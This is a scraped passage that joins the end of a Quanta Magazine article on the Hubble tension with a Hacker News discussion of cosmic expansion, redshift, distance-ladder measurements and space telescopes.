“[It] is a one-step measurement for H0,” Frye said, “which makes it completely independent.” They measured an expansion rate of 75.4 km/s/Mpc, although with a large uncertainty of +8.1 or −5.5 km/s/Mpc. Frye expects to refine those error bars after a few more years of similar measurements. Both Riess’ and Freedman’s teams also anticipate that the next few years of JWST observations will enable them to home in on an answer with their traditional, star-based methods. “With the improvement in the data, this is ultimately going to be solved, and I think pretty quickly,” Freedman said. “We’re going to get to the bottom of this.” By Liz Kruesi Contributing Writer August 13, 2024 View PDF/Print Mode astronomyastrophysicscosmologyHubble constantJames Webb Space TelescopephysicsAll topics Share this article Copied! Newsletter Get Quanta Magazine delivered to your inbox Subscribe now Recent newsletters The Quanta Newsletter Get highlights of the most important news delivered to your email inbox Email Subscribe Recent newsletters Comment on this article Quanta Magazine moderates comments to facilitate an informed, substantive, civil conversation. Abusive, profane, self-promotional, misleading, incoherent or off-topic comments will be rejected. Moderators are staffed during regular business hours (New York time) and can only accept comments written in English. Show comments Next article The Geometric Tool That Solved Einstein’s Relativity Problem",
    "commentLink": "https://news.ycombinator.com/item?id=41234964",
    "commentBody": "The Webb Telescope further deepens the Hubble tension controversy in cosmology (quantamagazine.org)154 points by nsoonhui 6 hours agohidepastfavorite114 comments grishka 1 hour agoWhat if the universe doesn't expand at all? What if we're completely wrong and redshift is caused by something else entirely, like some yet-undiscovered phenomenon that occurs to spacetime or electromagnetic waves? How can we be so sure it's space that's expanding, not time? The more I read about this, the more it feels like phlogiston theory[1]. Works great for describing observations at first, but as more observations are made, some contradict the theory, so exceptions are made for these cases (phlogiston must have negative mass sometimes/there must be extra matter or energy for galaxies to spin as fast as they do), and then finally someone discovers something (oxygen/???) that explains all observations much simpler and requires no weird exceptions. [1] https://en.wikipedia.org/wiki/Phlogiston_theory reply antognini 9 minutes agoparentThere is a very old theory called the \"Tired Light Hypothesis\" which supposes that for some unknown reason light loses energy as it travels over cosmological distances. This would reproduce the observed redshifts, but it has issues predicting pretty much every other cosmological observation. In particular it doesn't explain observed reductions in surface brightness (expansion has the effect of \"defocusing\" collimated light). And it doesn't explain observed time dilation effects. reply lieks 4 minutes agoparentprevI remember reading, a long, long time ago, a paper where the authors suggested if the universe was slightly hyperbolic, it would also cause a redshift effect. I can't seem to find it (and as far as I remember it was purely theoretical), but at the time I thought it was an neat idea. Not that I have the background to know what else they might not have accounted for to reach this conclusion. reply dotnet00 1 hour agoparentprevWe can create and observe doppler shift by making things move towards/away from us. Thus it is proven that if something is moving away from us, it will produce a redshift. In the absence of evidence that something else is causing the redshift, the assumption should be that it is a result of things moving away from us. As an obvious example, doppler shift often needs to be accounted for to communicate with spacecraft. reply nilkn 48 minutes agorootparentX causes Y does not mean that Y implies X. It’s reasonable to suspect X given Y and an absence of other such causal relations, but it’s not necessarily reasonable to spend decades building layers and layers of models that assume X at the most basic level. reply dotnet00 11 minutes agorootparentIf we can suspect X given Y, but we shouldn't build models on top of the assumption of X, then what are we supposed to do with Y? To me it seems like you're arguing that it was a bad idea to build on the assumption of Newton's theory of gravity because eventually it would be replaced by Einstein's theories of relativity. Which is obviously not sensible, since Einstein's theories were in part the result of trying to explain inaccurate predictions made by building on Newton's theory. reply ko27 33 minutes agorootparentprevYou are not a making insightful point at all. Nothing in the world can guarantee you that \"Y implies X\", after all, we can be living in a simulation. Does that mean we should shutdown all scientific discussions by repeating what you stated? Of course not. reply nilkn 28 minutes agorootparentPoint out where I said we should “shutdown all scientific discussions.” You won’t be able to, and you will then realize how incredibly absurd what you just wrote is. reply MichaelZuo 22 minutes agorootparentThe parent is pointing out that the prior comment is literally meaningless, and self defeating too, since the same logic would apply to your own existence, or simulated existence. Including any possible words you could ever write. (As far as any other HN reader could ever perceive) reply nilkn 5 minutes agorootparentDon’t you think jumping to a complete existential crisis over such a simple comment is a little extreme? That alone is a red flag that maybe dogma has taken over. No, nothing I wrote suggests one must shut down all scientific discussion or inquiry. No, it does not mean you cannot investigate X and its implications. No, it does not mean you cannot build speculative models on top of X. Yes, it does mean it’s important to be careful with language and avoid enshrining what is only an assumption as an unassailable fact of reality for generations. treflop 28 minutes agorootparentprevEveryone knows this. But without looking at the direct rules of the system, this is the best you can do. It’s not like you can just open the source code of the universe. You observe and make a theory that explains the observations, then the theory holds at least until a new observation contradicts the theory. Is the current theory wrong? Maybe. But everything can be wrong and the world is always welcome to hear a new theory that completely explains all current observations. But to just say a theory is wrong without providing a completely explained new one adds nothing. reply nilkn 1 minute agorootparentEverybody knows it, but the principle is selectively applied. For instance, our observations imply both general relativity and quantum field theory are necessary to model various aspects of the world. That’s an example of a Y. The only known X that’s ever been discovered that can encompass all aspects of that Y at all energy levels is string theory. Yet we are rightly careful to assume string theory is correct and enshrine it into the core body of scientific consensus. That does not mean we cannot or should not investigate it or even theory build on top of it, but it does mean we should refrain from assuming it must be true just because nobody can find anything better. exe34 25 minutes agorootparentprevI think everybody would be happy if you came up with a different explanation! what's happened so far is that we have a known mechanism, and no alternative explanations have worked yet. reply narfay 18 minutes agorootparentprevThis is wrong on several levels: 1. As other commenter said, X causes Y does not mean that Y implies X. There can be another cause for the Doppler. And surprisingly, 2. There is at least one known mechanism that cause Doppler WITHOUT moving: when the observer is in a gravity well (ex: earth) and observing a stationary object outside the gravity well (ex: some fixed point in outer space) reply dotnet00 8 minutes agorootparentAs I've mentioned in another post, that leads to questioning one of the most well tested theories in physics, so you need extraordinary evidence to prove it over something as elementary as doppler shift. Like, if it's Earth's gravity well causing us to see things differently, then things that are further from Earth should observe things differently. reply mr_mitm 52 minutes agoparentprevHow would you explain the CMB? We can literally see that the universe used to be much denser. reply grishka 37 minutes agorootparentAnd if the universe was much denser, doesn't that imply that all that matter affected its surroundings gravitationally? And as we know, time runs slower near large masses. And when something falls into a black hole, according to our very own theories, it would also red-shift because of the black hole's gravitational pull without anything having to expand. reply hughesjj 2 minutes agorootparentIt's really trippy to think about how hawking radiation becomes 'real' once its sufficiently 'far' away from a 'strong' gravitational well, and how this can be thought of as a Doppler shift giving real physical presence (in that we can interact and be affected by ) to what was once a 'virtual' particle I think scienceclic does a good job visualizing this, but end of the day I can't see a way to distinguish event horizons regardless if they're a black hole or the distant past/big bang. https://youtu.be/isezfMo8kWQ?si=9wGliV-Qo1bXCTRy Specifically look at the relativity of the vacuum section, which builds to a great insight at around 5:45 reply mr_mitm 32 minutes agorootparentprevNo, it implies it expanded in the meantime. We can see that it was a hot plasma up until 300k years after the big bang. This isn't some redshifted illusion, the matter was literally packed so densely and thus so hot that it was in another aggregate state. Don't get hung up on redshifts for evidence of the big bang. The CMB is the real smoking gun. Read up on it, it's entirely worth it. I can recommend Simon Singh's book \"Big Bang\". There is also a plethora of other probes that in concordance all point to the same thing: that the universe is almost 14 billion years old and expanded from a very hot, dense state. It's settled science, really. reply grishka 27 minutes agorootparentSpeaking of the big bang, how did time work back then? :) It's cool to say \"in the first milliseconds of the existence of the universe X and Y happened\", but how did time supposedly run as usual while everything else was on the fringe of our understanding of reality? There don't seem to be any answers to this (or I haven't looked thoroughly enough) but it feels like a very important question that's always overlooked by everyone talking about this. reply Balgair 0 minutes agorootparentYeah, it is overlooked because the real answers are 'hidden' behind a lot of graduate level math. And most people don't really want to learn a bookcase worth of math first to talk about it, but they talk all the same. Like, if you'd like to really dive into it then you're going to need to go through a lot of textbooks first. If you are moderately familiar with multi-variable calc, then here is a good book to get started down the GR hole: https://www.amazon.com/Mathematical-Methods-Physicists-Compr... Suffice to say, yes, there have been a lot of grad students that have the exact same questions and issue that you currently have. Further, once they have reached the end of the mathematical education required to understand how space time works in the first few minutes of the universe, they focus those questions into the issues we have with inflation. Those issues mostly come from our lack of understanding about how GR and QM interact, so the first 10e-43 seconds or so. At least, that is my understanding. Physicists are welcome to tell me how dumb I am right now! nobody9999 9 minutes agoparentprev>What if the universe doesn't expand at all? What if we're completely wrong and redshift is caused by something else entirely, like some yet-undiscovered phenomenon that occurs to spacetime or electromagnetic waves? How can we be so sure it's space that's expanding, not time? I suppose that's possible. Does that hypothesis adequately explain our observations? Is the model we currently have completely \"correct\"? Almost certainly not. But it appears to be less wrong[0] than earlier models. If you (or anyone) can show how the above describes our observations better and more completely than our current models, then it's likely \"less wrong.\" But you offer no evidence or even logical argument to support your hypothesis. As such, it's not much more than idle speculation and essentially equivalent, from a scientific standpoint, as suggesting the universe is a raisin dropped into a sugar syrup solution[1] and absorbing the liquid -- hence the expansion of the universe. [0] https://en.wikipedia.org/wiki/The_Relativity_of_Wrong [1] https://en.wikipedia.org/wiki/Compote reply mwbajor 11 minutes agoparentprevThe observation of the Hubble constant requires us to measure distance to an object in space. This is very hard to do at the extreme distances required (https://en.wikipedia.org/wiki/Parallax). In the end, the variation in the Hubble constant might be only due to our limited accuracy in measurement. reply parkaboy 4 hours agoprevNaive question: why should the expansion rate need to be uniform or constant everywhere? I'm likely misinterpreting the article, but it seems to frame things in a way that first assumes expansion should be constant and it's a question of what the right constant value is between the measured/theoretical discrepancies. (*yeesh, editing all those spelling errors from typing on my phone) reply chongli 4 hours agoparentThe controversy is that we get 2 different numbers depending on which method (cosmic microwave background vs cosmic distance ladder) we use to calculate the present rate of expansion. These numbers used to have their error bars overlapping, so we assumed they would eventually converge to the true value. But as we get more data the opposite is happening: the numbers are diverging and their error bars are shrinking such that they no longer overlap. This tells us that either our model of the universe is wrong (therefore the cosmic microwave background method is giving us an incorrect answer) or that something is wrong with how we're calculating the distances along the cosmic distance ladder. The latter was originally the assumption that should be proven true with more and better data from newer telescopes. This is now turning out not to be the case: our cosmic distance ladder calculations seem to have been very good, so it now seems more likely that our model of the universe is wrong. reply detourdog 3 hours agorootparentThank you for this explanation. I would like to emphasize that our model being wrong and not our numbers sounds like progress. It also sound like progress that we seem to have 2 “scales” to play with to try to develop a consistently measurable distance. reply sounds 2 hours agorootparentprevI remember reading that the local group, Laniakea Supercluster and the great attractor [1] are new developments that helped us refine our understanding of H0 but didn't fundamentally remove the controversy. It's exciting to see how the question drives many new discoveries. [1] https://en.wikipedia.org/wiki/Great_Attractor I'll try to paraphrase what it meant: measuring H0 comes down to measuring the relative velocity of galaxies around us. The great attractor was a relatively recent discovery that the \"closer\" galaxies, the ones we can use in the distance ladder, all have a common component in their velocities which we've recently begun to understand better. reply sdenton4 2 hours agorootparentprevInteresting, though, that they're getting different numbers using different kinds of stars, which does suggest problems with the distance ladder. reply api 3 hours agorootparentprevDistance ladder seems much more error prone than the CMB. reply artemonster 3 hours agorootparentthere is no \"seems\" with provable error bars reply feoren 2 hours agorootparentehh ... everything we measure relies on our understanding of the universe in some way. It's perfectly reasonable that our distance measurements could rely on a shakier foundation of assumptions than our understanding of the CMB. I don't know enough to say one way or the other, but GP's comment is not unreasonable on its face. Whereas talking about \"provable\" in cosmology, and certainly in this case, does seem unreasonable -- especially with error bars, which by definition have a small chance of not including the real value. Normally I'd say that we can generally refine our assumptions to be extremely good, and just take more measurements, and keep narrowing that error bar, until we hit a level of certainty that anyone reasonable would call \"proven\", but the entire point of TFA is that this isn't happening in this case. We seem on our way to \"proving\" two inconsistent things. reply shepardrtc 3 hours agorootparentprev> so it now seems more likely that our model of the universe is wrong. Whenever a scientist says that it's not possible that the model is wrong, then I just roll my eyes. Of course models can be wrong - and isn't that exciting? Good on them for making sure that there are no errors in the measurements - that's incredibly valuable and absolutely necessary - but I'm really excited to see creative models being thought up that are drastically different. My personal hell is the universe being consistent and boring. reply jfengel 2 hours agorootparentScientists have to cope with \"you just said your model is wrong therefore I am right about everything ever\". It makes them sometimes shortcut their way out of conversations that they know will not lead anywhere useful. reply shepardrtc 2 hours agorootparentThat seems like an exaggeration. reply exe34 21 minutes agorootparentwhich part? reply mr_mitm 2 hours agorootparentprev> Whenever a scientist says that it's not possible that the model is wrong, then I just roll my eyes. But no one said that. Im fact, scientists are known to say things like: all models are wrong, but some are useful. reply shepardrtc 2 hours agorootparentFrom the article: > That the three methods disagree “is not telling us about fundamental physics,” Freedman said. “That’s telling us there’s some systematic [error] in one or more of the distance methods.” Freedman is saying that the model is not wrong. reply dotnet00 2 hours agorootparentWhat she means is that the bar for proving that this is an error in physics is much higher than that of proving that it's a measurement error. Like, if you're measuring acceleration due to gravity, and your sensor/calculation gives you 5m/s^2 rather than the real ~9.81m/s^2 that everything else measures, you can't immediately resort to arguing that physics is wrong, you have to rule out that your sensor/calculation is wrong first. To argue that the physics is wrong, you are likely to be arguing that very well tested theories like general relativity, special relativity or electromagnetism are off in some way. That's a much higher bar than just the measurements of either the ladder or CMB being wrong in some way. reply exe34 19 minutes agorootparentto add to this, it's equivalent to the difference between trying to justify that one experiment (or one class of experiments) is wrong vs several dozens of classes of thousands of experiments are all subtly wrong so that this one experiment can be right. reply mr_mitm 1 hour agorootparentprevShe's following a hunch, it's what scientists do. In this case the hunch is that the model is not wrong. That's a far cry from saying it's impossible to be wrong. reply shepardrtc 36 minutes agorootparentWhere does she say she's following a hunch? She was very certain when she said that. reply exe34 18 minutes agorootparentwhen she's certain, you'll know, because she'll publish it. reply lamontcg 2 hours agorootparentprevThat researcher has a personal conviction that the model isn't wrong. That is spurring them to spend the years and decades necessary to assemble the experimental evidence to test the model. Either it'll turn out to be wrong or right in the end, but the conviction is what gives that individual researcher the impetus to keep scratching at the problem for a good chunk of their life. You shouldn't really roll your eyes at that. They're ultimately doing all the work which will prove it right or wrong. They might wind up not liking the answer they get, but the conviction is necessary to get them there because human emotions are weird. reply immibis 2 hours agorootparentprevWho said it was impossible? In fact, someone just said it was quite likely. reply diob 3 hours agoparentprevSo a lot of astronomy is based on the principle that we are not in a special pocket of the universe. See https://en.wikipedia.org/wiki/Cosmological_principle Basically, if this weren't to hold true, a lot of astronomy would fall over, even physics. reply eikenberry 53 minutes agorootparentSeems there are 2 ideas at odds. One is that the universe is infinite, in which case this is all localized and has no bearing on the universe outside of our small observable region. The other is that we are seeing enough of a bounded universe where the observations we make are of a significant enough chunk to make theories about it. reply XorNot 2 hours agorootparentprevThough it is worth noting if this were the case you would expect to see boundaries: if the laws of physics change due to spatial position, the discontinuity should produce an effect of some sort where matter and light transitions between regions. reply mcswell 1 hour agorootparentI suppose there could be a gradual change over distance, i.e. the first derivative of this change never varies. reply hindsightbias 1 hour agorootparentprevSophon is amused: https://en.wikipedia.org/wiki/Axis_of_evil_(cosmology) reply isolli 4 hours agoparentprevIndeed. Some researchers have proposed quintessence, a time-varying form of dark energy [0]. > A group of researchers argued in 2021 that observations of the Hubble tension may imply that only quintessence models with a nonzero coupling constant are viable. [0] https://en.wikipedia.org/wiki/Quintessence_(physics) reply itishappy 4 hours agoparentprevIt's not constant (the early universe inflated quite quickly), and it doesn't need to be uniform, but it sure does appear to be. We measure it via redshift, pulsar timing arrays, and the temperature fluctuations of the CMB, and it looks pretty much the same in all directions. reply Jeff_Brown 45 minutes agoparentprevSeems perfectly possible. General relativity, after all, was precisely the discovery that the curvature of space, well spacetime, is not uniform. reply JumpCrisscross 3 hours agoparentprev> what should the expansion rate need the be uniform or constant everywhere? It doesn't. \"The simplest explanation for dark energy is that it is an intrinsic, fundamental energy of space\" [1]. That's the cosmological constant. Dark energy is a thing because we don't assume that to be the case. Irrespective of your dark energy model, however, there will be a predicted global average. [1] https://en.wikipedia.org/wiki/Dark_energy reply tzs 2 hours agorootparentThere has been some interesting recent work that may get rid of the need for dark energy. Briefly, recent large scale maps of the universe suggest that the universe might not be as uniform as we thought it was. In particular we appear to be in a large region (something like a couple billion light years across) of low density. Dark energy is needed to make the solution to Einstein's field equations for the whole universe match observations. However that solution was derived based on a universe with matter distributed uniformly. At the time it was first derived that appeared to be the case--we thought the Milky Way was the whole universe. When we learned that the Milky Way was just a small galaxy in a vastly larger universe than had thought we were in and that there were bazillions of other galaxies, those galaxies appeared to be distributed uniformly enough the the solution to the field equations still worked. Later we found that there is some large scale structure in the distribution of galaxies, like superclusters, but those seemed uniform enough throughout the universe that things still worked. If that couple of billion light year low density region turns out to exist (large scale mapping of the universe is hard enough that it may just be observational error) the universe may not actually be uniform enough to for the field equations based on uniform matter distribution to actually work. Some researchers worked out the solutions to the field equations for a universe that has such large low density bubbles big enough to invalidate the uniform universe solution, and found that such a universe would have an expansion force without the need to invoke any kind of dark energy. There was a recent PBS Space Time episode that covered this: \"Can The Crisis in Cosmology be SOLVED With Cosmic Voids\" [1]. The above is my summary of what I remember from that. See the episode for a better explanation and references to the research. [1] https://www.youtube.com/watch?v=WWqmccgf78w reply BossingAround 4 hours agoparentprevThat's the first thing that occurred to me too. It could also not be constant even at the same place, i.e. could it not be speeding up and slowing down as the universe expands? reply AnimalMuppet 4 hours agoparentprevThe issue here is that it's not constant depending on the type of star we use to measure it. It's not a discrepancy in location in space. Or at least that's how I read the article. reply photochemsyn 3 hours agoparentprevSpacetime is apparently extremely rigid as it supports the transmission of gravitational waves originating billions of light-years away, as detected by the LIGO experiments. This suggests smooth and gradual uniform expansion, at least spatially. Temporal variation (speeding up and slowing down uniformly at all points) might be possible but seems hard to explain. reply xhkkffbf 3 hours agoparentprevCertainly when I look at convection currents in the ocean or the atmosphere, I see plenty of variation. Shoot, the earth's atmosphere constantly produces moving blobs of relatively high and low pressure. reply sdenton4 3 hours agoprev\"researchers started using Cepheids to calibrate the distances to bright supernovas, enabling more accurate measurements of H0.\" It seems like if there were some error in the luminosity measurement for cepheids, it would propagate to the measurements with supernovas... I would expect that stacking measurement techniques (as is common with cosmology, where distances are vast and certainty is rare) would also stack error, like summing the variance in gaussians... reply FredPret 3 hours agoparentIt'd be cool if we launched several space telescopes on Voyager-like trajectories. In 50-100 years they'd get a much better angular fix on stars that are too distant for Earth-orbit-sized angular measurements. https://en.wikipedia.org/wiki/Stellar_parallax reply AprilArcus 2 hours agorootparentThey'd need some very big RTGs to last that long, and I don't think we manufacture plutonium at the necessary volumes for that anymore. reply ars 37 minutes agorootparentI would use Americium-241 instead, longer half life and much more availability. Lower power, but a telescope like this does not need constant power, so some kind of short term power storage (capacitor I would assume, or some kind of ultra long life battery) could handle that. reply KennyBlanken 2 hours agorootparentprevLast I remember, RTG manufacturing was very constrained, period. And that was before Russia took a massive shit in Ukraine and got themselves embargo'd by most of the rest of the developed world. reply ianburrell 2 hours agorootparentprevThe other solution is to increase the accuracy of parallax. This is what the Gaia project is doing. It can measure distance to stars in galactic center to 20%. It will measure distance to 2 billion stars and be super accurate within 300 ly. reply silverquiet 1 hour agorootparentprevNew Horizons has taken some star pictures from the Kuiper Belt and you can easily spot the parallax of some nearby stars just by eyeball. I'm not sure that it has a good enough camera for any kind of precision measurement, but it was really cool to see that. reply HPsquared 3 hours agorootparentprevThat'd be a nice use for Starship. reply jvanderbot 2 hours agorootparentWell, no it wouldn't actually. It'd be a nice use for falcon heavy - to get them the necessary delta-v. But the constraint isn't cargo space on launch. This isn't a starlink constellation, the orbits are necessarily massively different, meaning each spacecraft needs its own large delta-v so a single-launch, multiple spacecraft option is less attractive. The constraint is budget, fuel, and ambition. Now what you could do is get a telescope out around a far outer planet and use the orbital parallax like we do from earth. A Starship might have a bunch of extra cargo space for this. But I just don't see how it is better than a big faring on falcon heavy. EDIT: You know what? I am completely mistaken here. I was not thinking about the diff b/w FH and starship correctly. reply baq 2 hours agorootparentYou can easily put a third stage bigger than the whole F9 second stage in the payload bay of the Starship and you likely wouldn't need a super complicated unfolding deployment procedure for the payload thanks to the enormous volume. Once the thing becomes reliable there are zero missions the FH can do that starship can't with a payload equipped with a third stage motor. reply jvanderbot 2 hours agorootparentOK I'll bite: What does starship add here? It's a very large re-useable faring that carries a stage + payload into orbit? Why not attach to the top of FH? Why: FH + Starship w/( rocket + payload) And not: FH + (rocket + payload) reply dotnet00 1 hour agorootparentFH is already very thin and tall, probably not practical to stick another stage on top even if it could work payload wise. Besides that, SLS and New Glenn are the only ones with comparable lift capacities, SLS is way too expensive for the capability and the massive SRBs make the ride pretty rough, New Glenn is probably a feasible alternative, although probably more expensive than Starship. reply ianburrell 2 hours agorootparentprevGaia is pretty small, 710kg. It was launched on Soyuz. Falcon 9 has payload to Mars of 4 tons, and Falcon Heavy has 9 tons to Pluto. I bet both would work. reply dotnet00 2 hours agorootparentprevStarship could give a single telescope a stronger boost than an FH could, and depending on the mass of one telescope (along with all the redundancies, power sources and transmitters such a long term mission would need), the telescope could be launched with an extra boost stage. So, several Starship launches for several telescopes. reply HPsquared 2 hours agorootparentprevMore lift capacity means more fuel capacity onboard the telescope(s). reply XorNot 2 hours agorootparentprevI think the problem with such a mission right now is the high probability we could launch a faster mission in the very near future - i.e. with NASA looking at spaceborne nuclear propulsion again, we could send much more capable telescopes out faster - which is not just an \"I want it now\" benefit: time in space is time you run potentially having components wear out or break. So getting them onto their missions ASAP is a huge de-risking element. reply Bluestein 2 hours agorootparentI wonder - and I am sure this has been examined to death - if there's some calculation that can be performed to find the \"optimum\" wait-or-release-now pattern, given a certain rate of technological development vs. distance/years ... I am sure there are calculations for this ... PS. Of course, the rate of technological development is the unknown variable hete, I am sure.- reply TeMPOraL 2 hours agorootparentI imagine such calculations immediately break down when you make the input (funding, interest) depend on the output. Which is the case in reality. For example, say your calculations say that the optimal time for the mission is 10 years from now, once a currently in-development propulsion technology matures. You publish that, and the investors, government and the public, all motivated to support you by the dream of your ambitious mission, suddenly lose interest. Your funding dries out, as you're repeatedly told to call back in 10 years. The fact that the 10 year estimate, having been dependent on existing funding, is now \"literally never\", escapes them. See also: \"nuclear fusion is always 30 years away\". It is, because original 30 year timeframe assumed continued funding that never happened, and it's not happening because \"it's always been 30 years away\". reply Bluestein 1 hour agorootparentLiterally a moving target ... > You publish that, and the investors, government and the public, all motivated to support you Interesting how PR/culture indeed is a factor - a tangible factor in this. Indeed optimizing for \"PR Goodwill\" might be a thing ... reply pimlottc 1 hour agorootparentprevAs Mark Twain once said, “the best time to launch a tree into space was twenty years ago. The second best is now” reply mcswell 1 hour agorootparentDunno about Mark Twain, but it appears the best time to launch men to the Moon was more than half a century ago. The second best is now...ok, a year from now...I mean a few years from now. reply antognini 2 hours agoparentprevThese uncertainties in Cepheid luminosities are accounted for in Type Ia distance measurements. Particularly with Gaia we can now calibrate the luminosities of Cepheids in our galaxy using parallax observations. (Knowing this field I'm sure there are some astronomers who argue that there are still some systematic uncertainties that are not fully being accounted for, but from what I understand it's pretty hard to account for it with the Gaia results at this point.) reply hindsightbias 1 hour agoparentprev\"But according to Freedman, the galaxies’ supernovas seemed to be intrinsically brighter than the ones in farther galaxies. This is another puzzle cosmologists have yet to understand, and it also affects the H0 value. \" reply seanhunter 4 hours agoprevSome cool background about the Hubble constant here, including a nice explanation involving blueberry muffins https://news.uchicago.edu/explainer/hubble-constant-explaine... reply mcswell 1 hour agoparentI just finished off a blueberry bagel, the taste is still in my mouth. Maybe the universe is torus-shaped? reply eisvogel 1 hour agoprevThe opening sentence of this article is 100% wrong. Hubble was a good scientist and correctly made no assumptions regarding his observations that objects that are further away by parallax are more red shifted. The assumption that these observations indicated an expanding universe was delivered to us by LeMaitre; if you believe in an expanding universe with a finite age, then give credit where it is due... reply fartsucker69 3 hours agoprevwhen did it start that the storytelling around every piece of physics news was framed as a controversy? I know it's been a while, but I feel like it wasn't this way 20 years ago... reply z3t4 3 hours agoprevDid I read it wrong, or does the universe expand at 10% of speed of light!? Could that possible be why the measurements are off? A close object vs an object very far away might look like they are in different places relatively. reply evanb 47 minutes agoparentIt's likely you read it wrong; there is no sense in which the universe's expansion has a fixed speed. The Hubble parameter is speed/distance [the figure's axis is km/s/Mpc, for example]. That is the natural unit to explain an expansion rate: things that are farther away ALSO move away from you faster (because the space between you and them all grows at a fixed rate). reply mr_mitm 2 hours agoparentprevRest assured, this has been taken into account. The scientists who spend their life working on this topic have had the same thoughts you had within minutes of learning about the problem. It's extremely basic stuff actually. reply feoren 1 hour agoparentprevThe observable universe has a radius of about 14 Gigaparsecs. If H0 is 67.4 km/s/Mpc, then a naive calculation puts the edge of the observable universe expanding at 943,600 km/s, or about 3 times the speed of light. Of course we still observe this as merely \"close to\" the speed of light, but the point is that most of the universe is shooting away from us so fast that we will never see them as they are \"now\", even if we wait billions of years. We have no way of ever interacting with most of the \"modern\" universe, even theoretically. They might as well be in different universes. All we will ever see is their images from billions of years ago, even if we wait billions of years from now. reply ajross 3 hours agoprevFrustrating that all the comments seem to be jumping in to talk about dark energy and quintessence and multiverse pontification, when the actual contention in the linked article is that all of this may turn out to be a measurement error and that the Hubble tension may not actually exist after all. reply ck2 3 hours agoprevIf you really want to overload your mind thinking about this, imagine this universe is only a bubble crowded into a group of other bubbles, like a kid blowing soap bubbles. So the pressure around our bubble is not uniform, there are more bubbles on one side than another, other bubbles are much larger and some are very tiny causing tiny \"lumps\" of pressure in various places on our bubble. Decades ago I really liked the \"big collapse\" theory that has now been abandoned, it was so \"simple\" in comparison to a universe that keeps expanding and not uniformly at that. reply turndown 2 hours agoparentJust because we are natives of this universe does not mean its behavior or characteristics will be naturally sensible to us. There is no “real” reason it should be something “simple” or reasonable to us. The universe simply is; us as well. reply readthenotes1 4 hours agoprev\"This extrapolation predicts that the cosmos should currently be expanding at a rate of 67.4 km/s/Mpc, with an uncertainty that’s less than 1%.\" I can't measure my own weight with an uncertainty that's less than 1%. I wonder what these peeps are on... reply shagie 4 hours agoparentDepending on which end of the scale you are interested in, the NIST would be an interesting place to work. How To Measure The Tiniest Forces In The Universe https://youtu.be/pXoZQsZP2PY and World's Heaviest Weight https://youtu.be/_k9egfWvb7Y - both from Veritasium. From the expanded description on the heaviest weight: > Before visiting NIST in Washington DC I had no idea machines like this existed. Surely there's an accurate way to measure forces without creating such a huge known force?! Nope. This appears to be the best way, with a stack of 20 x 50,000 lb masses creating a maximum force of 4.45 MN or 1,000,000 pounds of force. I also wouldn't have thought about all the corrections that need applying - for example buoyancy subtracts about 125 pounds from the weight of the stack. Plus the local gravitational field strength must be taken into account. And, the gravitational field varies below grade. All of this must be taken into account in order to limit uncertainty to just five parts per million (.0005%) reply itishappy 3 hours agoparentprevSkill issue. reply halayli 56 minutes agoparentprevReading your very confident response it makes me wonder the same about you. reply gangorgasm 3 hours agoparentprevWhat is \"Mpc\"., if anybody knows? reply tyfon 3 hours agorootparentIt is a distance unit, megaparsecs. Or approximately 3.25 million light years. reply gangorgasm 3 hours agorootparentAppreciated. Big distance I have difficulty conceptualizing \"distance over time ... over [huge] distance\" I guess it means \"chunks about so [megaparsecs] large are moving [themselves] at a speed of so many Km. per second\" but I could be wrong reply tyfon 3 hours agorootparentThe measurement for expansion is linear with distance, so two spots one Mpc from another moves away front each other at 67.4 km/s while two spots two Mpcs from each other moves at 134.8km/s. This means the expansion is accelerating and some parts of the now visible universe will eventually move away from us faster than the speed of light resulting in them disappearing from our view. The distances, time and speeds are indeed very hard to comprehend from our usual references :) reply gangorgasm 3 hours agorootparentIt's crazy that some parts of the universe will actually for all purposes vanish Thanks for taking time to break it all down reply daedrdev 2 hours agorootparentAt some point there will only be the galaxies in our local group visible, it's interesting to imagine a future civilization only having such a limited universe to view. reply ryandrake 2 hours agorootparentDoesn't this mean that on a long enough time frame, an observer anywhere in the universe won't be able to see anything because everything else in the universe is too far away to be visible? reply shagie 1 hour agorootparentSimply - yes. Furthermore, civilizations that arise in that era of the universe will likely have a different cosmology than what we are able to understand today. If you could only see the galaxy that you are in, you wouldn't be able to see galaxies that were forming shortly after the Big Bang, or be able to use supernovas in other galaxies to measure the scale of the universe. Kurzgesagt did a video on that - TRUE Limits Of Humanity – The Final Border We Will Never Cross https://youtu.be/uzkD5SeuwzM reply layer8 1 hour agorootparentprevIt means that a chunk of space with length 1 megaparsec will be 67.4 km longer a second later. If you divide that new length by the old length, you get the factor by which space expands each second. It’s a very small factor (i.e. very close to 1), but there are also many seconds. reply 613style 3 hours agorootparentprevmegaparsec (1 million parsecs) reply gangorgasm 3 hours agorootparentThanks much reply uncivilized 4 hours agoparentprevTheir wallets are much bigger than yours. reply readthenotes1 4 hours agorootparentAs is what they are trying to measure. I don't believe 1% measurement error in any universal element except perhaps the speed of light... reply munchler 3 hours agorootparentI suggest you take a look at this list of physical constants, paying special attention to the \"uncertainty\" column, and then get back to us on why you don't accept any of them except the speed of light. https://en.wikipedia.org/wiki/List_of_physical_constants reply aidenn0 4 hours agorootparentprevThat's an absurd statement. For example, planck's constant is known to better than 1%, as is the mass of various particles. Heck, the Earth, which is sufficiently non-spherical for it to matter only differs in radius (between polar and equatorial) by 0.3%! reply bloak 3 hours agorootparentprevHere's a nice list: https://en.wikipedia.org/wiki/List_of_physical_constants G (the gravitational constant) is an interesting one: the value is only known to about 5 significant figures, but GM (the gravitational constant multiplied by the mass of the Earth) is known a lot more accurately, unsurprisingly, considering how well GPS works. Some of those constants seem to be known to about 12 significant figures. reply dotnet00 3 hours agorootparentprevIf you can measure the speed of light extremely precisely, you can measure a lot of constants extremely precisely. reply acyou 1 hour agoprev [–] The current scientific consensus is actually pretty good - the consensus being that standard theory, quantum theory, big bang theory, particle theory, universe expansion model all have as good a likelihood as not of going down in history the same way as miasma theory, phlogiston theory and Newtonian classical mechanics, given the apparent and vast shortcomings of basic science around our universe's constitution, composition and origins. It's a mature and constructive recognition of our limitations and where we can improve. One of the proximate causes around our failure to progress in this and other areas is the funding model of publish or perish. Many researchers are trying to carve out a career, but not necessarily to contribute to progress or advancement. An examination of the funding structure and incentives for universities and researchers appears to be in order. One suggestion would be to limit grants for private universities and colleges. Another would be to cap compensation for university and college staff. Yet another would be to add funding or tax breaks for technology scale up and application development in the private sector. And another would be cutting funding to masters', PhD and post-doc levels, and increasing funding for 1-, 2- and 4- year career oriented and skill development programs. Yet another suggestion would be limiting loan eligibility to 1-, 2- and 4- year degree or lower programs. Another would be tying university and college funding to the success of attached technology scale up and application development programs. Another would be requiring undergraduate and lower grants and tuition revenue to be spent directly on those programs and 